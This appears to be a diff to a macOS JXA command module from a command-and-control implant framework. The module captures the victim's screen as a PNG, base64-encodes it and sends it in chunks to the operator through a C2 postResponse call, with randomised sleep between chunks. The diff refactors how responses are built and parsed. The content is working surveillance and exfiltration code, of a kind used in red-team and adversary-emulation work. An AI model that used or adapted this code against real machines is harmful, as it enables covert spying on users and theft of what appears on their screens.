@@ -3,8 +3,8 @@ exports.screencapture = function(task, command, params){
         ObjC.import('Cocoa');
         ObjC.import('AppKit');
         let cgimage = $.CGDisplayCreateImage($.CGMainDisplayID());
-        if(cgimage.js == undefined){
-          return JSON.stringify({"user_output":"Failed to get image from display", "completed": true, "status": "error"});
+        if(cgimage.js === undefined){
+          return {"user_output":"Failed to get image from display", "completed": true, "status": "error"};
         }
         let bitmapimagerep = $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);
         let capture = bitmapimagerep.representationUsingTypeProperties($.NSBitmapImageFileTypePNG, Ref());
@@ -13,17 +13,15 @@ exports.screencapture = function(task, command, params){
         let fileSize = parseInt(capture.length);
         // always round up to account for chunks that are < chunksize;
         let numOfChunks = Math.ceil(fileSize / chunkSize);
-        let registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
-        registerData = convert_to_nsdata(registerData);
+        let registerData = {'total_chunks': numOfChunks, 'task': task.id};
         let registerFile = C2.postResponse(task, registerData);
-        if (registerFile['status'] === "success"){
+        if (registerFile['responses'][0]['status'] === "success"){
             let currentChunk = 1;
             let csize = capture.length - offset > chunkSize ? chunkSize : capture.length - offset;
             let data = capture.subdataWithRange($.NSMakeRange(offset, csize));
             while(parseInt(data.length) > 0 && offset < fileSize){
                 // send a chunk
-                let fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
-                fileData = convert_to_nsdata(fileData);
+                let fileData = {'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['responses'][0]['file_id']};
                 C2.postResponse(task, fileData);
                 $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());
 
@@ -33,13 +31,13 @@ exports.screencapture = function(task, command, params){
                 data = capture.subdataWithRange($.NSMakeRange(offset, csize));
                 currentChunk += 1;
             }
-            return JSON.stringify({"user_output":JSON.stringify({"task":"finished", "file_id": registerFile['file_id']}), "completed": true});
+            return {"user_output":JSON.stringify({"file_id": registerFile['responses'][0]['file_id']}), "completed": true};
         }
         else{
-            return JSON.stringify({"user_output":"Failed to register file to download", "completed": true, "status": "error"});
+            return {"user_output":"Failed to register file to download", "completed": true, "status": "error"};
         }
     }catch(error){
-        return JSON.stringify({"user_output":"Failed to get a screencapture: " + error.toString(), "completed": true, "status": "error"});
+        return {"user_output":"Failed to get a screencapture: " + error.toString(), "completed": true, "status": "error"};
     }
 };
 COMMAND_ENDS_HERE
